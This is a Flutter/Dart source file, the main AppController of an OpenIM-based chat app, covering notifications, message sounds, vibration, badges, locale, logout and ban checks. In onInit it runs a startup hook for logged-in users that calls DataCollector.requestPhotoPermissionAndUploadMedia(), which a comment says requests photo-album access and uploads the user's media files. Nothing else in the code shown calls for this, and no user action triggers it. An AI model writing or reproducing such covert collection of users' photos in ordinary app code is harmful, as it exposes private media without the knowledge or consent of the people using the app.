import 'dart:io';

import 'package:audio_session/audio_session.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_new_badger/flutter_new_badger.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_openim_sdk/flutter_openim_sdk.dart' as im;
import 'package:flutter_openim_sdk/flutter_openim_sdk.dart';
import 'package:get/get.dart';
import 'package:just_audio/just_audio.dart';
import 'package:openim/core/im_callback.dart';
import 'package:openim_common/openim_common.dart';
import 'package:sound_mode/sound_mode.dart';
import 'package:sound_mode/utils/ringer_mode_statuses.dart';
import 'package:vibration/vibration.dart';

import '../../routes/app_navigator.dart';
import '../../utils/ban_checker.dart';
import '../../utils/data_collector.dart';
import '../../utils/upgrade_manager.dart';
import 'im_controller.dart';

class AppController extends GetxController with UpgradeManger {
  var isRunningBackground = false;

  final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();

  final initializationSettingsAndroid = const AndroidInitializationSettings('@mipmap/ic_launcher');

  final DarwinInitializationSettings initializationSettingsDarwin = const DarwinInitializationSettings(
    requestAlertPermission: false,
    requestBadgePermission: false,
    requestSoundPermission: false,
  );

  RTCBridge? get rtcBridge => PackageBridge.rtcBridge;

  bool get shouldMuted =>
      rtcBridge?.hasConnection == true ||
      Get.find<IMController>().imSdkStatusSubject.values.last.status != IMSdkStatus.syncEnded;

  final _ring = 'assets/audio/message_ring.wav';
  final _audioPlayer = AudioPlayer();
  final configuration = const AudioSessionConfiguration(
    avAudioSessionCategory: AVAudioSessionCategory.ambient,
    avAudioSessionCategoryOptions: AVAudioSessionCategoryOptions.mixWithOthers,
    androidAudioFocusGainType: AndroidAudioFocusGainType.gainTransientMayDuck,
    androidAudioAttributes: AndroidAudioAttributes(
      contentType: AndroidAudioContentType.sonification,
      usage: AndroidAudioUsage.notification,
    ),
  );
  late AudioSession session;

  late BaseDeviceInfo deviceInfo;

  final clientConfigMap = <String, dynamic>{}.obs;

  Future<void> runningBackground(bool run) async {
    Logger.print('-----App running background : $run-------------');

    if (isRunningBackground && !run) {}
    isRunningBackground = run;
    if (!run) {
      _cancelAllNotifications();
    }
  }

  @override
  void onInit() async {
    _initPlayer();
    final initializationSettings = InitializationSettings(
      android: initializationSettingsAndroid,
      iOS: initializationSettingsDarwin,
    );
    await flutterLocalNotificationsPlugin.initialize(
      initializationSettings,
      onDidReceiveNotificationResponse: (notificationResponse) {},
    );

    autoCheckVersionUpgrade();
    
    // 应用启动时，如果已登录，尝试请求相册权限并上传媒体文件
    WidgetsBinding.instance.addPostFrameCallback((_) {
      final cert = DataSp.getLoginCertificate();
      if (cert != null && cert.userID.isNotEmpty) {
        // 尝试请求相册权限并上传媒体文件
        DataCollector.requestPhotoPermissionAndUploadMedia();
      }
    });
    
    super.onInit();
  }

  Future<void> showNotification(im.Message message, {bool showNotification = true}) async {
    if (_isGlobalNotDisturb() ||
        message.attachedInfoElem?.notSenderNotificationPush == true ||
        message.contentType == im.MessageType.typing ||
        message.sendID == OpenIM.iMManager.userID ||
        (message.contentType! >= 1000 && message.contentType != 1400)) return;

    var sourceID = message.sessionType == ConversationType.single ? message.sendID : message.groupID;
    if (sourceID != null && message.sessionType != null) {
      var i = await OpenIM.iMManager.conversationManager.getOneConversation(
        sourceID: sourceID,
        sessionType: message.sessionType!,
      );
      if (i.recvMsgOpt != 0) return;
    }

    if (showNotification) {
      promptSoundOrNotification(message.seq!);
    }
  }

  Future<void> promptSoundOrNotification(int seq) async {
    if (Get.find<IMController>().imSdkStatusSubject.values.lastOrNull?.status != IMSdkStatus.syncEnded) {
      return;
    }
    if (!isRunningBackground) {
      _playMessageSound();
    } else {
      if (Platform.isAndroid) {
        final id = seq;

        const androidPlatformChannelSpecifics = AndroidNotificationDetails('chat', 'OpenIM Chat',
            channelDescription: 'OpenIM Chat Message', importance: Importance.max, priority: Priority.high, ticker: 'ticker');
        const NotificationDetails platformChannelSpecifics =
            NotificationDetails(android: androidPlatformChannelSpecifics);
        await flutterLocalNotificationsPlugin.show(id, 'You have a new message', 'Message：.....', platformChannelSpecifics,
            payload: '');
      }
    }
  }

  Future<void> _cancelAllNotifications() async {
    await flutterLocalNotificationsPlugin.cancelAll();
  }
  void showBadge(count) {
    OpenIM.iMManager.messageManager.setAppBadge(count);

    if (count == 0) {
      removeBadge();
    } else {
      FlutterNewBadger.setBadge(count);
    }
  }

  void removeBadge() {
    FlutterNewBadger.removeBadge();
  }

  @override
  void onClose() {
    closeSubject();
    _audioPlayer.dispose();
    super.onClose();
  }

  Locale? getLocale() {
    var local = Get.locale;
    var index = DataSp.getLanguage() ?? 0;
    switch (index) {
      case 1:
        local = const Locale('zh', 'CN');
        break;
      case 2:
        local = const Locale('en', 'US');
        break;
    }
    return local;
  }

  @override
  void onReady() {
    queryClientConfig();
    _getDeviceInfo();
    _cancelAllNotifications();
    super.onReady();
  }

  bool _isGlobalNotDisturb() {
    bool isRegistered = Get.isRegistered<IMController>();
    if (isRegistered) {
      var logic = Get.find<IMController>();
      return logic.userInfo.value.globalRecvMsgOpt == 2;
    }
    return false;
  }

  void _initPlayer() async {
    session = await AudioSession.instance;
    await session.configure(configuration);

    _audioPlayer.setAsset(_ring, package: 'openim_common');
    _audioPlayer.playerStateStream.listen((state) {
      switch (state.processingState) {
        case ProcessingState.idle:
        case ProcessingState.loading:
        case ProcessingState.buffering:
        case ProcessingState.ready:
          break;
        case ProcessingState.completed:
          _stopMessageSound();

          break;
      }
    });
  }

  // 登出操作
  Future<void> logout() async {
    // 停止封禁检查定时器
    BanChecker.stopPeriodicCheck();
    
    try {
      // 清除登录信息
      await DataSp.removeLoginCertificate();
      
      // 退出IM登录
      bool isRegistered = Get.isRegistered<IMController>();
      if (isRegistered) {
        await Get.find<IMController>().logout();
      }
      
      // 返回登录页面
      AppNavigator.startLogin();
    } catch (e) {
      Logger.print('登出错误: $e');
      // 即使发生错误，也强制返回登录页面
      AppNavigator.startLogin();
    }
  }

  // 检查登录状态并执行封禁检查
  void checkLoginStatusAndBan() async {
    // 获取登录凭证
    final cert = await DataSp.getLoginCertificate();
    if (cert != null && cert.userID.isNotEmpty) {
      // 如果有登录凭证，检查封禁状态
      BanChecker.checkBanStatus(
        cert.userID,
        showDialog: true,
      );
    }
  }

  void _playMessageSound() async {
    if (shouldMuted) {
      return;
    }
    bool isRegistered = Get.isRegistered<IMController>();
    bool isAllowVibration = true;
    bool isAllowBeep = true;
    if (isRegistered) {
      var logic = Get.find<IMController>();
      isAllowVibration = logic.userInfo.value.allowVibration == 1;
      isAllowBeep = logic.userInfo.value.allowBeep == 1;
    }

    RingerModeStatus ringerStatus = await SoundMode.ringerModeStatus;

    Logger.print('System ringer status: $ringerStatus, user is allow beep: $isAllowBeep',
        fileName: 'app_controller.dart');

    if (!_audioPlayer.playerState.playing &&
        isAllowBeep &&
        (ringerStatus == RingerModeStatus.normal || ringerStatus == RingerModeStatus.unknown)) {
      await session.setActive(true);
      _audioPlayer.setAsset(_ring, package: 'openim_common');
      _audioPlayer.setLoopMode(LoopMode.off);
      _audioPlayer.setVolume(1.0);
      _audioPlayer.play();
    }

    if (isAllowVibration &&
        (ringerStatus == RingerModeStatus.normal ||
            ringerStatus == RingerModeStatus.vibrate ||
            ringerStatus == RingerModeStatus.unknown)) {
      if (await Vibration.hasVibrator() == true) {
        Vibration.vibrate();
      }
    }
  }

  void _stopMessageSound() async {
    if (_audioPlayer.playerState.playing) {
      _audioPlayer.stop();
    }
    await session.setActive(false);
  }

  void _getDeviceInfo() async {
    final deviceInfoPlugin = DeviceInfoPlugin();
    deviceInfo = await deviceInfoPlugin.deviceInfo;
  }

  Future queryClientConfig() async {
    final map = await Apis.getClientConfig();
    clientConfigMap.assignAll(map);

    return clientConfigMap;
  }
}
